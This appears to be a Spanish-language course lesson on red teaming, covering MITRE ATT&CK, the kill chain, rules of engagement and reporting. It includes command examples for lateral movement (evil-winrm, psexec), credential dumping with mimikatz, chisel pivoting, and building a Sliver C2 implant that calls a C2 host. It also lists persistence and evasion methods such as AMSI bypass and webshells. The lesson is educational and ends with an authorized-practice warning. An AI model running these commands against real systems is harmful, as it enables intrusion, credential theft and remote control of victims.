Fase 3 — Red Team y Técnicas Avanzadas

Red Team — Simulación de ataques reales con MITRE ATT&CK

El Red Team simula ataques reales contra una organización para evaluar su capacidad de defensa. No es solo "explotar una vulnerabilidad" — es un ejercicio completo que incluye reconocimiento, acceso inicial, movimiento lateral, persistencia y exfiltración. En esta lección aprenderás a planificar y ejecutar una operación de Red Team usando el framework MITRE ATT&CK.

1. ¿Qué es Red Team?

Un Red Team es un equipo que simula ser un adversario real (APT, cibercriminal, insider) para probar la seguridad de una organización de forma integral: tecnología, procesos y personas.

EquipoRolObjetivo
🔴 Red TeamAtacanteSimular ataques reales, encontrar caminos de compromiso completo
🔵 Blue TeamDefensorDetectar, responder y contener los ataques del Red Team
🟣 Purple TeamColaboraciónRed + Blue trabajan juntos para mejorar las defensas
⬜ White TeamÁrbitroSupervisa el ejercicio, define las reglas de engagement

2. Red Team vs Pentesting

AspectoPentestingRed Team
ObjetivoEncontrar vulnerabilidades técnicasProbar la capacidad de detección y respuesta
AlcanceDefinido (app, red, servidor)Amplio (toda la organización)
Duración1–4 semanas2–6 meses
SigiloNo necesarioEsencial — evitar detección
TécnicasTécnicas (exploits, misconfig)Técnicas + phishing + físicas + social engineering
Blue Team sabeSí, es coordinadoNo — el ejercicio es sorpresa
EntregableLista de vulnerabilidades + CVSSNarrativa de ataque completa + mejoras de detección

3. MITRE ATT&CK: el mapa del atacante

MITRE ATT&CK es una base de conocimiento que categoriza las tácticas y técnicas que usan los adversarios reales. Es tu guía para planificar operaciones de Red Team.

TácticaPregunta que respondeEjemplo de técnica
Reconnaissance¿Cómo recopilo información?T1593: Buscar en sitios web públicos
Resource Development¿Cómo preparo mi infraestructura?T1583: Comprar dominios para phishing
Initial Access¿Cómo entro a la red?T1566: Phishing con adjunto malicioso
Execution¿Cómo ejecuto mi código?T1059: PowerShell, Python, Bash
Persistence¿Cómo mantengo el acceso?T1053: Tareas programadas
Privilege Escalation¿Cómo obtengo más permisos?T1068: Explotar vulnerabilidad del kernel
Defense Evasion¿Cómo evito ser detectado?T1027: Ofuscar archivos/información
Credential Access¿Cómo obtengo credenciales?T1003: Dump de credenciales (mimikatz)
Discovery¿Qué hay en la red?T1018: Descubrimiento de sistemas remotos
Lateral Movement¿Cómo me muevo a otras máquinas?T1021: RDP, SMB, WinRM
Collection¿Qué datos recojo?T1005: Datos de sistemas locales
Exfiltration¿Cómo saco los datos?T1048: Exfiltración por protocolo alternativo
Impact¿Qué daño puedo causar?T1486: Ransomware (cifrar datos)

4. Cyber Kill Chain

    Cyber Kill Chain (Lockheed Martin):
    
    1. Reconocimiento    → Investigar el objetivo (OSINT, escaneo)
    2. Armamento         → Crear el payload/exploit
    3. Entrega           → Enviar el ataque (email, web, USB)
    4. Explotación       → Explotar la vulnerabilidad
    5. Instalación       → Instalar backdoor/C2
    6. Comando y Control → Establecer comunicación con el C2
    7. Acciones sobre    → Exfiltrar datos, ransomware, destrucción
       objetivos

Cada eslabón roto detiene el ataque — la defensa en profundidad funciona

5. Planificación de una operación

Antes de cualquier ataque, necesitas un Rules of Engagement (RoE) firmado:

Elementos del RoE:
  • Alcance: ¿Qué sistemas, redes y personas están incluidas?
  • Exclusiones: ¿Qué NO se puede atacar? (sistemas críticos de producción)
  • Técnicas permitidas: ¿Se permite phishing? ¿Acceso físico? ¿Ingeniería social?
  • Contacto de emergencia: ¿A quién llamas si algo sale mal?
  • Ventana temporal: ¿Cuándo se ejecuta el ejercicio?
  • Objetivos específicos: "Obtener acceso a la base de datos de clientes"

8. Movimiento lateral y escalada

Movimiento lateral
# Moverse a otra máquina via WinRM
$ evil-winrm -i 10.10.10.5 -u admin -p 'Password123'

# Via SMB con PsExec
$ impacket-psexec empresa.local/admin:pass@10.10.10.5

# Dump de credenciales con Mimikatz (en Windows)
mimikatz# sekurlsa::logonpasswords

# Pivoteo: usar una máquina comprometida como puente
$ chisel server -p 8080 --reverse  # En tu máquina
$ chisel client TUIP:8080 R:socks  # En la víctima
# Ahora tienes un proxy SOCKS para pivotar

9. Persistencia y evasión

Técnica de persistenciaDescripción
Scheduled TasksCrear tarea programada que ejecute tu beacon
Registry Run KeysAgregar ejecutable al autostart de Windows
WMI Event SubscriptionEvento WMI que ejecuta código ante un trigger
Golden TicketTicket Kerberos forjado que nunca expira
SSH KeysAgregar tu clave SSH al authorized_keys (Linux)
WebshellShell en el servidor web (PHP, ASPX)
Técnicas de evasión:
  • AMSI Bypass: Deshabilitar el Antimalware Scan Interface de Windows
  • Obfuscation: Ofuscar payloads con herramientas como ScareCrow
  • Living off the Land (LOLBins): Usar binarios legítimos de Windows (certutil, mshta, regsvr32)
  • Timestomping: Modificar marcas de tiempo de archivos
  • Process Injection: Inyectar código en procesos legítimos

11. Infraestructura C2

Un Command & Control (C2) es el servidor desde el cual controlas los sistemas comprometidos.

Framework C2TipoCaracterísticas
SliverOpen SourceModerno, multi-plataforma, soporte DNS/HTTP/mTLS. Recomendado para aprender.
Cobalt StrikeComercialEl estándar de la industria. Beacon, Malleable C2, BOFs.
HavocOpen SourceAlternativa moderna a Cobalt Strike con GUI.
MythicOpen SourceFramework modular con múltiples agentes y perfiles C2.
Sliver C2 básico
# Instalar Sliver
$ curl https://sliver.sh/install | sudo bash

# Iniciar Sliver
$ sliver

# Generar un implante (beacon)
sliver > generate --http tu-c2.com --os windows --arch amd64 --save implant.exe

# Iniciar listener HTTP
sliver > http

# Cuando la víctima ejecute implant.exe, verás:
[*] Session opened: RANDOM_NAME - 10.10.10.5:49832

12. Reporte de Red Team

Estructura del reporte:
  1. Resumen ejecutivo: Para directivos. ¿Se logró el objetivo? ¿Cuál es el riesgo real?
  2. Narrativa del ataque: Historia completa paso a paso, con timeline
  3. Técnicas MITRE ATT&CK usadas: Mapear cada acción a una técnica
  4. Evidencias: Screenshots, logs, artefactos capturados
  5. Detección del Blue Team: ¿Qué detectaron? ¿Qué NO detectaron?
  6. Recomendaciones: Mejoras de detección, prevención y respuesta

Practica responsable

Todas las tecnicas de esta leccion deben practicarse exclusivamente en entornos autorizados: laboratorios locales, maquinas virtuales propias o plataformas como TryHackMe y HackTheBox. El acceso no autorizado a sistemas informaticos es un delito.
